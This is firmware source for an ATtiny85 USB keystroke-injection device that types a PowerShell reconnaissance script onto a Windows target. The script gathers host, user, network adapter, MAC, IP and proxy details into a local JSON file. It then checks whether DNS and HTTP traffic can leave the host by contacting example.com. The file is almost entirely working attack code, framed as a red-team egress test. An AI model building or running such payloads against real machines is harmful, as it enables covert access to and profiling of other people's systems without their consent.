// recon/egress-beacon - Tier 2
//
// Proves what this host can reach, and whether it can call home.
//
// Beacon.json is local only - it does not send anything anywhere. The two
// tests at the end are what tell you whether this host could exfiltrate,
// which is a question about the control, not an attempt to.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "$a=Get-NetAdapter -EA 0|Where-Object {$_.Status -eq 'Up'}|Select-Object -First 1"
    "$ips=Get-NetIPAddress -EA 0|Where-Object {$_.IPAddress -notlike '127.*'}|Select-Object -Expand IPAddress"
    "@{timestamp=(Get-Date).ToString('o');host=$env:COMPUTERNAME;user=$env:USERNAME;adapter=$a.Name;mac=$a.MacAddress;ips=($ips -join ',');proxy=(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -EA 0).ProxyServer}|ConvertTo-Json|Out-File 'C:\\Users\\Public\\ds-recon\\beacon.json'"
    "'=== DNS RESOLUTION TEST (proves egress) ==='"
    "try{Resolve-DnsName example.com -Type A -EA Stop|Select Name,IPAddress|Format-Table -Auto|Out-String}catch{'DNS BLOCKED: '+$_.Exception.Message}"
    "'=== HTTP EGRESS TEST ==='"
    "try{$r=Invoke-WebRequest -Uri 'http://example.com' -UseBasicParsing -TimeoutSec 8 -EA Stop;'HTTP OK: '+$r.StatusCode}catch{'HTTP BLOCKED: '+$_.Exception.Message}"
    "Invoke-Item 'C:\\Users\\Public\\ds-recon\\beacon.json'"
    R_OUT("egress-beacon.txt")
    R_SHOW("egress-beacon.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
